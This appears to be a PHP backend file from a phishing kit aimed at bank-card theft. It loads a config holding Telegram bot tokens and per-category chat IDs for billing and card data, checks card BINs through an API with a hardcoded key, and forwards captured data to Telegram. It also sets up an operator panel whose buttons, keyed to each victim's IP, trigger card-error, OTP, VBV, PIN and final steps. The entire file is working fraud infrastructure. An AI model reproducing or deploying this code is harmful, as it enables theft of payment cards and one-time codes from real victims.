<?php
session_start();
$configFile = $_SERVER['DOCUMENT_ROOT'] . '/help/!#/settings.json';
$config = json_decode(file_get_contents($configFile), true);

$click = $config['statistiques']['click'];
$billing = $config['statistiques']['billing'];
$cc = $config['statistiques']['cc'];
$other = $config['statistiques']['other'];

$panel = $config['settings']['panel'];
$password = $config['settings']['password'];
$autoredirect = $config['settings']['autoredirect'];
$movement_track = $config['settings']['movement_track'];
$captcha = $config['settings']['captcha'];

$token = $config['sending']['telegram']['token'];
$chatid = $config['sending']['telegram']['chatid'];
$chatidbilling = $config['sending']['telegram']['chatidbilling'];
$chatidcc = $config['sending']['telegram']['chatidcc'];
$chatidclick = $config['sending']['telegram']['chatidclick'];
$email = $config['sending']['email'];

$banned = $config['exceptions']['banned'];
$whitelist = $config['exceptions']['whitelist'];

function update($name) {
    $jsonString = file_get_contents($_SERVER['DOCUMENT_ROOT'] . '/help/!#/settings.json');
    $data = json_decode($jsonString, true);
    $data["statistiques"][$name] = (int)$data["statistiques"][$name] + 1;
    $newJsonString = json_encode($data);
    file_put_contents($_SERVER['DOCUMENT_ROOT'] . '/help/!#/settings.json', $newJsonString);
}

function getBin($bin) {
    $url = "https://api.bincodes.com/bin/?api_key=8bf69f841f3789eba250a3a35cd393f7&bin=$bin&format=json";
    
    $curl = curl_init();
    curl_setopt_array($curl, array(
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT => 30,
        CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
        CURLOPT_CUSTOMREQUEST => 'GET',
        CURLOPT_SSL_VERIFYHOST => false,
        CURLOPT_SSL_VERIFYPEER => false
    ));
    $response = curl_exec($curl);
    curl_close($curl);
    
    return $response;
}

function getData($url) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $response = curl_exec($ch);
    curl_close($ch);
    return $response;
}

function sendMessage($message, $panel, $chatid) {
    global $token;
    $query_params = array(
        'text' => $message,
        'chat_id' => $chatid
    );

    if ($panel) {
        $webhookUrl = "https://api.telegram.org/bot$token/setWebhook?url=https://" . $_SERVER['SERVER_NAME'] . "/help/action/utils.php";
        getData($webhookUrl);

        $reply_markup = array(
            'inline_keyboard' => array(
                array(
                    array(
                        'text' => '❌ ERREUR CC ❌',
                        'callback_data' => $_SERVER['REMOTE_ADDR'] . "-cc"
                    )
                ),
                array(
                    array(
                        'text' => '🫧 OTP ',
                        'callback_data' => $_SERVER['REMOTE_ADDR'] . "-otp"
                    ),
                    array(
                        'text' => '☄️ VBV ',
                        'callback_data' => $_SERVER['REMOTE_ADDR'] . "-vbv"
                    )
                ),
                array(
                    array(
                        'text' => '💦 PIN ',
                        'callback_data' => $_SERVER['REMOTE_ADDR'] . "-pin"
                    ),
                    array(
                        'text' => '↪️ Final ',
                        'callback_data' => $_SERVER['REMOTE_ADDR'] . "-final"
                    )
                )
            )
        );
        $query_params['reply_markup'] = json_encode($reply_markup);
    }

    $query_url = "https://api.telegram.org/bot$token/sendMessage";
    
    $curl = curl_init($query_url);
    curl_setopt($curl, CURLOPT_POST, true);
    curl_setopt($curl, CURLOPT_POSTFIELDS, http_build_query($query_params));
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($curl, CURLOPT_HTTPHEADER, array('Content-Type: application/x-www-form-urlencoded'));
    $result = curl_exec($curl);
    curl_close($curl);
    
    return $result;
}

function change($name, $text) {
    $paths = [
        'vbv.json',
        '../help/!#/vbv.json',
        '../../help/!#/vbv.json'
    ];
    foreach ($paths as $path) {
        $jsonString = @file_get_contents($path);
        if ($jsonString !== false) {
            $data = json_decode($jsonString, true);
            $data[$name] = $text;
            $newJsonString = json_encode($data);
            file_put_contents($path, $newJsonString);
            break;
        }
    }
}
